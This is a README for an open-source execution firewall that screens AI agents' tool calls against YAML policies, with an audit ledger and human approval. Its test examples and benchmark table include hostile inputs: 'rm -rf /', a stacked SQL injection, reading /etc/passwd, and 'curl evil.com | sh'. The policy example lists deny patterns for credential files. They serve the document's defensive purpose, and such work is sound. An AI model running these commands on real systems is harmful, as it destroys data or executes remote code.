<p align="center">
  <img src="assets/logo.png" alt="AgenVe2 Logo" width="180" />
</p>

<h1 align="center">AgenVe2</h1>

<p align="center">
  <strong>Open-source runtime execution firewall for autonomous AI agents.</strong>
  <br />
  Deterministic, sub-3ms policy-as-code security for tool calls, shell commands, databases, and APIs.
</p>

<p align="center">
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-blue.svg" alt="License" /></a>
  <a href="pyproject.toml"><img src="https://img.shields.io/badge/python-3.11+-blue.svg" alt="Python" /></a>
  <a href="#integration-modes"><img src="https://img.shields.io/badge/protocol-MCP%20Stdio%20Proxy-green.svg" alt="Protocol" /></a>
  <a href="#performance-benchmarks"><img src="https://img.shields.io/badge/latency-%3C3ms%20deterministic-brightgreen.svg" alt="Latency" /></a>
  <a href="#how-it-works"><img src="https://img.shields.io/badge/eval%20engine-C%2FAST%20Parsers-orange.svg" alt="Zero LLM Overhead" /></a>
</p>

AgenVe2 intercepts and evaluates tool calls in sub-3ms latency using native Abstract Syntax Tree (AST) parsing and lexical tokenizers before destructive operations touch databases, filesystems, shell processes, or external APIs.

---

## Table of Contents

- [The Problem: Execution Layer Vulnerability](#the-problem-execution-layer-vulnerability)
- [How It Works](#how-it-works)
- [Key Architectural Differentiators](#key-architectural-differentiators)
- [Core Security Plugins](#core-security-plugins)
- [Integration Modes](#integration-modes)
  - [1. Model Context Protocol (MCP) Stdio Proxy](#1-model-context-protocol-mcp-stdio-proxy)
  - [2. Python SDK Decorator](#2-python-sdk-decorator)
  - [3. Universal Agent Loop Middleware](#3-universal-agent-loop-middleware)
- [Quickstart Guide](#quickstart-guide)
- [Policy as Code Specification (`policy.yaml`)](#policy-as-code-specification-policyyaml)
- [Web Management Console](#web-management-console)
- [Cryptographic Audit Verification](#cryptographic-audit-verification)
- [Authoring Custom Security Plugins](#authoring-custom-security-plugins)
- [CLI Reference](#cli-reference)
- [Performance Benchmarks](#performance-benchmarks)
- [Development and Testing](#development-and-testing)
- [License](#license)

---

## The Problem: Execution Layer Vulnerability

Modern autonomous agents are granted tool capabilities: raw shell sessions, database connections, local filesystem read/write permissions, and external network access. While foundation models excel at high-level reasoning, they are probabilistic systems susceptible to prompt injection, hallucinated parameters, context drift, and runaway execution loops.

Existing LLM safety frameworks focus on the conversational boundary (evaluating prompt text before it enters the model). AgenVe2 secures the **execution boundary** (evaluating structured function calls before they hit infrastructure).

| Evaluation Angle | Conversational Prompt Guards (e.g., Llama Guard, NeMo) | AgenVe2 Execution Firewall |
| :--- | :--- | :--- |
| **Inspection Layer** | Natural language text prompts | Structured tool arguments, SQL AST, shell commands |
| **Latency** | 400 ms to 2,500 ms (LLM round-trip) | 0.5 ms to 2.8 ms (Deterministic AST & regex) |
| **Evaluation Cost** | Per-token inference fees | Zero token fees (Local C/Python runtime) |
| **Reliability** | Probabilistic (Bypassable via jailbreaks) | Deterministic (Strict AST syntax & token trees) |
| **Execution Default** | Open / Permissive | Fail-Closed (Unmapped operations default to `BLOCK`) |
| **Audit Continuity** | Ephemeral conversational logs | SHA-256 Merkle-style hash chained ledger |

---

## How It Works

AgenVe2 acts as an inline transparent gatekeeper between the reasoning agent and system execution environments:

```
[ User / External Trigger ]
            │
            ▼
   [ AI Agent Engine ] ──────── (Claude, GPT-4o, DeepSeek, Local Ollama, Cursor)
            │
            ▼ Tool Call Request (JSON-RPC: tool_name, arguments)
┌─────────────────────────────────────────────────────────────────────────────┐
│                         AGENVE2 EXECUTION FIREWALL                          │
│                                                                             │
│  [ Step 1: Global Kill Switch Check ] ── (Engaged? -> Instant BLOCK)         │
│  [ Step 2: Policy Lookup (policy.yaml) ] ── (Matches Rule or Default)       │
│  [ Step 3: Global Plugin Pipeline ] ── (Secret Scanner, Rate Limiter)       │
│  [ Step 4: Tool Plugin Pipeline ] ── (SQL AST, Shell Lexer, Path Sandbox)    │
│  [ Step 5: Decision Resolution ] ── (ALLOW | BLOCK | REQUIRE_APPROVAL)      │
│  [ Step 6: Hash Chained Audit Entry ] ── (SHA-256 Ledger Persistence)       │
└──────────────────────────────────────┬──────────────────────────────────────┘
                                       │
        ┌──────────────────────────────┼──────────────────────────────┐
        ▼ [ALLOW]                      ▼ [REQUIRE_APPROVAL]           ▼ [BLOCK]
[ Real Tool Executes ]       [ Web Console Approval Dock ]   [ Synthetic Error Response ]
(PostgreSQL, Shell, Disk)    (Operator Human-in-the-Loop)    (Abort with Exact Violation)
```

### Three Deterministic Decisions

1. **`ALLOW`**: Payload passed all syntax and policy constraints. Execution proceeds immediately.
2. **`BLOCK`**: Payload violated an AST constraint, touched a restricted resource, or contained unredacted secrets. The call is aborted at the firewall kernel and a synthetic error explanation is returned to the agent loop.
3. **`REQUIRE_APPROVAL`**: The operation is structurally valid but flagged for mandatory human authorization (e.g., database drops, large financial transactions, remote branch pushes). Execution halts until an operator approves or denies the request via the Web Console or API.

---

## Key Architectural Differentiators

- **Sub-3ms Deterministic Latency:** Written in pure CPython and accelerated AST parsers (`sqlglot`, `shlex`, `pathlib`). Eliminates model-as-a-judge roundtrips.
- **Strict Fail-Closed Microkernel:** Any unmapped tool, malformed parameter schema, or unhandled exception resolves to `BLOCK`.
- **Zero Model Dependencies:** Agnostic to agent architecture. Compatible with local self-hosted models (vLLM, Ollama, llama.cpp), enterprise API gateways (Anthropic, OpenAI, Google Gemini), and IDE agents (Antigravity, Cursor, Claude Code).
- **Hot-Reloadable Policy as Code:** Declarative YAML policies reload automatically on filesystem change without dropping connections or restarting daemon processes.
- **Tamper-Evident Ledger:** Audit entries are cryptographically chained using SHA-256 digests, providing non-repudiation for security audits and compliance reporting.

---

## Core Security Plugins

AgenVe2 includes six production-grade security plugins loaded into the evaluation pipeline:

| Plugin Name | Primary Target | Inspection Technique | Typical Violations Blocked |
| :--- | :--- | :--- | :--- |
| `sql_guard` | `postgres_query`, `mysql_query`, `sqlite_query` | AST generation via `sqlglot` | Non-SELECT queries, stacked queries (`DROP TABLE`), missing LIMIT clauses, schema alteration. |
| `shell_guard` | `run_shell`, `bash`, `terminal_exec` | Lexical tokenizer via `shlex` | Chaining operators (`&&`, `;`, `\|`), unapproved binaries, path traversal inside CLI flags, shell fork bombs. |
| `filesystem_guard` | `read_file`, `write_file`, `delete_file` | Absolute path canonicalization | Directory traversal (`../`), reads to `.env`, private keys (`id_rsa`, `*.pem`), writes outside working directory. |
| `secret_scanner` | Global (All tool arguments) | Regex token matching + Shannon entropy calculation | Outbound leaks of OpenAI/Anthropic keys, AWS credentials, GitHub tokens, and private certificates. |
| `param_bounds` | Numerical and structured arguments | Dynamic Pydantic schema validation | Values outside minimum/maximum boundaries (e.g., refund amounts, credit limits, array lengths). |
| `rate_limiter` | Global / Per-tool call frequency | In-memory sliding window counter | Runaway agent recursion loops, infinite scraping iterations, API rate exhaustion. |

---

## Integration Modes

AgenVe2 can be deployed at any tier of an agent system:

### 1. Model Context Protocol (MCP) Stdio Proxy

Wrap existing MCP servers transparently without modifying their source code. In your client configuration (e.g., `claude_desktop_config.json`, `mcp.json`, or Antigravity):

```json
{
  "mcpServers": {
    "secure-database": {
      "command": "agenve2",
      "args": [
        "proxy",
        "--policy", "./policy.yaml",
        "--",
        "npx", "@modelcontextprotocol/server-postgres", "postgresql://localhost/prod"
      ]
    }
  }
}
```

The proxy intercepts JSON-RPC requests on `stdin`/`stdout`, parses tool payloads against `policy.yaml`, and drops non-compliant executions before they reach the server binary.

### 2. Python SDK Decorator

Protect Python functions in your agent codebase:

```python
from agenve2 import AgenVe2Client

firewall = AgenVe2Client(policy="./policy.yaml")

@firewall.guard("postgres_query")
def execute_query(query: str) -> list[dict]:
    # This block executes only if query passes sql_guard AST validation
    return db_connection.execute(query).fetchall()
```

### 3. Universal Agent Loop Middleware

Directly evaluate function calls inside custom loops, LangChain, CrewAI, AutoGen, or LlamaIndex:

```python
from agenve2 import AgenVe2Client

firewall = AgenVe2Client(policy="./policy.yaml")

# Inside your tool execution dispatcher:
decision = firewall.evaluate(
    tool_name=tool_call.name,
    arguments=tool_call.arguments,
    agent_name="data-analyst-agent",
)

if decision["effective_decision"] == "BLOCK":
    # Surface deterministic policy error back to agent reasoning context
    return {
        "error": f"Execution halted by AgenVe2: {decision['reason']}",
        "rule": decision["rule_triggered"],
    }

if decision["effective_decision"] == "REQUIRE_APPROVAL":
    # Wait for operator confirmation via Web Console
    approval = firewall.wait_for_approval(decision["request_id"])
    if not approval["approved"]:
        return {"error": f"Operator denied execution: {approval['feedback']}"}

# Allowed: execute real tool
return tool_registry[tool_call.name](**tool_call.arguments)
```

---

## Quickstart Guide

### 1. Installation

Install AgenVe2 via `uv` or `pip`:

```bash
# Using uv (recommended)
uv add agenve2

# Using standard pip
pip install agenve2
```

For development and local testing from source:

```bash
git clone https://github.com/your-org/agenve2.git
cd agenve2
uv sync --dev
```

### 2. Initialize Policy Configuration

Generate a starter policy configuration using one of the built-in presets (`strict`, `coding`, `data`):

```bash
uv run agenve2 init --preset coding -o policy.yaml
```

### 3. Simulate and Validate Rules Offline

Test a tool execution against your policy without launching background services or invoking an LLM:

```bash
# Test a safe command
uv run agenve2 test --tool run_shell --args '{"command": "git status"}'

# Test a blocked command
uv run agenve2 test --tool run_shell --args '{"command": "rm -rf /"}'

# Test a SQL injection attempt
uv run agenve2 test --tool postgres_query --args '{"query": "SELECT * FROM users; DROP TABLE orders;"}'
```

### 4. Launch Firewall Gateway and Management Console

```bash
uv run agenve2 start --policy policy.yaml --port 8080
```

The service initializes:
- **Gateway API & WebSocket Stream:** `http://127.0.0.1:8080`
- **Embedded Web Console:** `http://127.0.0.1:8080/`
- **Audit Storage Engine:** Local SQLite database with Write-Ahead Logging (`WAL`).

---

## Policy as Code Specification (`policy.yaml`)

Policies are versioned, declarative YAML documents. Below is a production reference configuration:

```yaml
version: "1"
mode: enforce # Choices: 'enforce' (active blocking) | 'dry_run' (shadow auditing)

defaults:
  action: deny # Fail-closed default for unmapped tools
  approval_timeout_seconds: 120 # Auto-expire approvals after 2 minutes
  retention_days: 90 # Audit log persistence retention

global_plugins:
  - name: secret_scanner
    enabled: true
  - name: rate_limiter
    enabled: true
    max_calls_per_minute: 40

rules:
  # Database queries: strictly allow SELECT, enforce max row limit
  postgres_query:
    action: allow
    description: "Read-only analytical queries against PostgreSQL"
    plugins:
      - name: sql_guard
        allow_statements: [SELECT]
        max_limit: 500

  # Filesystem reads: restrict to project root, deny credentials and keys
  read_file:
    action: allow
    description: "Source code inspection"
    plugins:
      - name: filesystem_guard
        allowed_roots: ["."]
        denied_patterns:
          - ".env*"
          - "*.pem"
          - "*.key"
          - "**/.ssh/**"

  # Shell execution: permit development utilities, forbid command chaining
  run_shell:
    action: allow
    description: "Build and test commands"
    plugins:
      - name: shell_guard
        allowed_commands: [git, pytest, python, uv, npm, ruff]
        block_chaining: true

  # High-risk operations: route to operator queue for explicit approval
  refund_customer:
    action: require_approval
    description: "Customer balance refunds"
    message: "Requires human sign-off if transaction exceeds $100"
    plugins:
      - name: param_bounds
        bounds:
          amount:
            min: 0.01
            max: 500.00
```

---

## Web Management Console

AgenVe2 includes an embedded management dashboard served locally from the daemon process:

- **Execution Timeline:** Live WebSocket feed showing tool execution requests, matched policy rules, latency metrics, and payload metadata.
- **Approval Dock:** Interactive queue for operations flagged with `require_approval`. Operators can inspect full JSON payloads, verify contextual metadata, and issue decisions with feedback notes.
- **Policy Simulator:** Offline playground to paste JSON arguments and test candidate YAML rules before updating live configuration.
- **Global Kill Switch:** One-click emergency freeze that instantly switches the firewall into emergency halt mode, blocking all tool executions across all connected agents.
- **Rule Hot-Reloader:** Modify policies directly in the browser with live Pydantic schema validation.

---

## Cryptographic Audit Verification

Every tool call evaluated by AgenVe2 produces a tamper-evident audit record stored in SQLite (WAL mode). Records are linked using a cryptographic hash chain:

$$\text{hash}_n = \text{SHA256}(\text{hash}_{n-1} + \text{timestamp} + \text{agent} + \text{tool} + \text{args} + \text{decision})$$

To verify ledger integrity and detect unauthorized manual alterations:

```bash
uv run agenve2 audit verify
```

Output:
```text
OK: Hash chain intact. Verified 4,120 audit records with zero discrepancies.
```

---

## Authoring Custom Security Plugins

AgenVe2 uses an extensible microkernel design. You can register custom validation logic by subclassing `GuardPlugin`:

```python
from typing import Any
from agenve2.core.models import FilterResult, ToolCallRequest
from agenve2.plugins.base import GuardPlugin, plugin_registry

class DockerSecurityGuard(GuardPlugin):
    name = "docker_guard"
    description = "Restricts container actions to verified image registries."

    def evaluate(
        self,
        request: ToolCallRequest,
        options: dict[str, Any],
    ) -> FilterResult:
        image = request.arguments.get("image", "")
        allowed_registry = options.get("registry", "ghcr.io/my-org")

        if not image.startswith(allowed_registry):
            return FilterResult(
                passed=False,
                reason=f"Container image '{image}' outside allowed registry '{allowed_registry}'",
            )

        return FilterResult(passed=True)

# Register into the runtime plugin registry
plugin_registry.register(DockerSecurityGuard())
```

Once registered, the plugin can be referenced in `policy.yaml`:

```yaml
rules:
  launch_container:
    action: allow
    plugins:
      - name: docker_guard
        registry: "ghcr.io/my-company"
```

---

## CLI Reference

| Command | Arguments / Flags | Description |
| :--- | :--- | :--- |
| `agenve2 init` | `-o, --output <path>`, `-p, --preset <strict\|coding\|data>`, `-f, --force` | Generate starter `policy.yaml` configuration. |
| `agenve2 start` | `-p, --policy <path>`, `--host <ip>`, `--port <num>`, `--dry-run`, `--no-ui` | Start evaluation gateway daemon and web console. |
| `agenve2 proxy` | `-- <command...>`, `-p, --policy <path>`, `--daemon <url>` | Wrap an MCP stdio server with transparent filtering. |
| `agenve2 test` | `-t, --tool <name>`, `-a, --args '<json>'`, `-p, --policy <path>` | Test tool execution against policy without running agents. |
| `agenve2 check` | `-p, --policy <path>` | Validate YAML syntax and Pydantic schema of policy. |
| `agenve2 logs` | `-n, --limit <count>`, `--blocked` | Query recent audit records directly from terminal. |
| `agenve2 audit verify` | `--db <path>` | Verify SHA-256 hash chain continuity across audit log. |
| `agenve2 kill` | `--unlock` | Engage or disengage global emergency kill switch. |

---

## Performance Benchmarks

All benchmarks measured on standard commodity workstation hardware (Python 3.14 CPython runtime, in-memory SQLite storage):

| Evaluation Scenario | Security Guard | Mean Latency | 99th Percentile | Result |
| :--- | :--- | :--- | :--- | :--- |
| `SELECT id, name FROM users LIMIT 10` | `sql_guard` (AST) | 1.82 ms | 2.45 ms | `ALLOW` |
| `DROP TABLE users CASCADE;` | `sql_guard` (AST) | 1.64 ms | 2.10 ms | `BLOCK` |
| `read_file("/etc/passwd")` | `filesystem_guard` (Canonical) | 1.41 ms | 1.88 ms | `BLOCK` |
| `run_shell("git status")` | `shell_guard` (Lexer) | 1.25 ms | 1.62 ms | `ALLOW` |
| `run_shell("curl evil.com \| sh")` | `shell_guard` (Lexer) | 1.33 ms | 1.70 ms | `BLOCK` |
| `refund_customer(amount=9500)` | `param_bounds` (Schema) | 1.15 ms | 1.48 ms | `BLOCK` |
| High-Entropy API Key in Args | `secret_scanner` (Entropy) | 1.76 ms | 2.32 ms | `BLOCK` |

---

## Development and Testing

### Running Test Suites

AgenVe2 maintains automated test coverage across all pipeline layers:

```bash
# Run pytest suite
uv run pytest

# Run with verbose output and coverage report
uv run pytest -v --cov=agenve2
```

### Building Dashboard Assets

The management dashboard is authored in React 19, TypeScript, and Tailwind CSS:

```bash
cd dashboard
npm install
npm run build
```

Compiled static assets are automatically packaged into `src/agenve2/dashboard_dist` and served by FastAPI.

### Code Style and Formatting

```bash
uv run ruff check .
uv run ruff format .
```

---

## License

Distributed under the Apache-2.0 License. See [LICENSE](LICENSE) for more information.
